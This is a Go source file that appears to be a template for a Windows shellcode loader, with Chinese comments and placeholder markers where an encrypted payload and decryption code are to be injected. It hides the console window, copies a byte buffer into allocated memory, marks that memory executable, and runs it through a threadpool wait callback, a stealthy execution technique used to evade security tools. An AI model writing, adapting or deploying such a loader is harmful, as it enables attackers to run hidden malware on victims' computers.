package main

import (
	"github.com/gonutz/ide/w32"
	"time"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)

func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}
// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__

	kernel32                       := windows.NewLazyDLL("kernel32.dll")
	ntdll                         := windows.NewLazyDLL("ntdll.dll")
	VirtualAlloc                   := kernel32.NewProc("VirtualAlloc")
	CreateEventW                   := kernel32.NewProc("CreateEventW")
	VirtualProtect                 := kernel32.NewProc("VirtualProtect")
	SetThreadpoolWait              := kernel32.NewProc("SetThreadpoolWait")
	CreateThreadpoolWait           := kernel32.NewProc("CreateThreadpoolWait")
	SetEvent                       := kernel32.NewProc("SetEvent")
	WaitForThreadpoolWaitCallbacks := kernel32.NewProc("WaitForThreadpoolWaitCallbacks")
	RtlMoveMemory                  := ntdll.NewProc("RtlMoveMemory")

	hEvent, _, _ := CreateEventW.Call(0, 0, 0, 0)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000|0x2000, 0x04)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
	oldProtect := 0x04

	// 设置内存属性为 可执行
	VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))

	// 创建线程池
	ptp_w, _, _ := CreateThreadpoolWait.Call(addr, 0, 0)
	SetThreadpoolWait.Call(ptp_w, hEvent, 0)
	SetEvent.Call(hEvent)
	WaitForThreadpoolWaitCallbacks.Call(ptp_w, 0)
	SetEvent.Call(hEvent)
	for {
		time.Sleep(9000)
	}
}
